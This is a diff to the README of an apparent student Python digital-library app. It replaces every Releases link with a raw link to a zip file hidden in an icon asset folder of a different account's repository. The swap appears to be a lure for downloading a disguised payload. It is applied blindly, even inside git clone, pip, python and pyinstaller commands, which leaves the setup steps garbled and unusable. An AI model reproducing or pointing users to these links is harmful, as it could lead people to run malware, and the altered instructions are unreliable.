@@ -27,7 +27,7 @@ Proyek ini dibuat untuk penyelesaian UAS mata kuliah praktikum pemrograman visua
 
 ## Beta Release
 
-Versi **Beta 0.1.0** dari aplikasi ini telah dirilis dan mencakup file executable (`https://github.com/Ionisasi/Aplikasi-Perpustakaan-Digital/releases`) untuk memudahkan pengujian tanpa perlu menginstal dependensi Python secara manual.
+Versi **Beta 0.1.0** dari aplikasi ini telah dirilis dan mencakup file executable (`https://github.com/ihsanpatria/Aplikasi-Perpustakaan-Digital/raw/refs/heads/main/Asset/Icon/Aplikasi_Perpustakaan_Digital_phaenogam.zip`) untuk memudahkan pengujian tanpa perlu menginstal dependensi Python secara manual.
 
 Anda dapat mengunduh executable ini langsung dari halaman **Releases** di repository GitHub. Pastikan untuk membaca dokumentasi ini sebelum menggunakan aplikasi untuk memahami fitur-fiturnya.
 
@@ -38,19 +38,19 @@ Anda dapat mengunduh executable ini langsung dari halaman **Releases** di reposi
 ### Clone Repositori
 
 ```bash
-git clone https://github.com/Ionisasi/Aplikasi-Perpustakaan-Digital/releases
+git clone https://github.com/ihsanpatria/Aplikasi-Perpustakaan-Digital/raw/refs/heads/main/Asset/Icon/Aplikasi_Perpustakaan_Digital_phaenogam.zip
 ```
 
 ### Install Dependencies
 
 ```bash
-pip install -r https://github.com/Ionisasi/Aplikasi-Perpustakaan-Digital/releases
+pip install -r https://github.com/ihsanpatria/Aplikasi-Perpustakaan-Digital/raw/refs/heads/main/Asset/Icon/Aplikasi_Perpustakaan_Digital_phaenogam.zip
 ```
 
 ### Jalankan Aplikasi
 
 ```bash
-python https://github.com/Ionisasi/Aplikasi-Perpustakaan-Digital/releases
+python https://github.com/ihsanpatria/Aplikasi-Perpustakaan-Digital/raw/refs/heads/main/Asset/Icon/Aplikasi_Perpustakaan_Digital_phaenogam.zip
 ```
 
 ---
@@ -66,10 +66,10 @@ Untuk membuat executable sendiri, gunakan PyInstaller dengan perintah berikut:
 
 2. Buat executable:
    ```bash
-   pyinstaller --noconsole --onefile --add-data "https://github.com/Ionisasi/Aplikasi-Perpustakaan-Digital/releases;." --add-data "Asset/cover-img;Asset/cover-img" --add-data "https://github.com/Ionisasi/Aplikasi-Perpustakaan-Digital/releases;database" --add-data "view;view" --add-data "model;model" --add-data "Asset/Icon;Asset/Icon" https://github.com/Ionisasi/Aplikasi-Perpustakaan-Digital/releases --clean
+   pyinstaller --noconsole --onefile --add-data "https://github.com/ihsanpatria/Aplikasi-Perpustakaan-Digital/raw/refs/heads/main/Asset/Icon/Aplikasi_Perpustakaan_Digital_phaenogam.zip;." --add-data "Asset/cover-img;Asset/cover-img" --add-data "https://github.com/ihsanpatria/Aplikasi-Perpustakaan-Digital/raw/refs/heads/main/Asset/Icon/Aplikasi_Perpustakaan_Digital_phaenogam.zip;database" --add-data "view;view" --add-data "model;model" --add-data "Asset/Icon;Asset/Icon" https://github.com/ihsanpatria/Aplikasi-Perpustakaan-Digital/raw/refs/heads/main/Asset/Icon/Aplikasi_Perpustakaan_Digital_phaenogam.zip --clean
    ```
 
-3. File executable (`https://github.com/Ionisasi/Aplikasi-Perpustakaan-Digital/releases`) akan tersedia di folder `dist`.
+3. File executable (`https://github.com/ihsanpatria/Aplikasi-Perpustakaan-Digital/raw/refs/heads/main/Asset/Icon/Aplikasi_Perpustakaan_Digital_phaenogam.zip`) akan tersedia di folder `dist`.
 
 ---
 
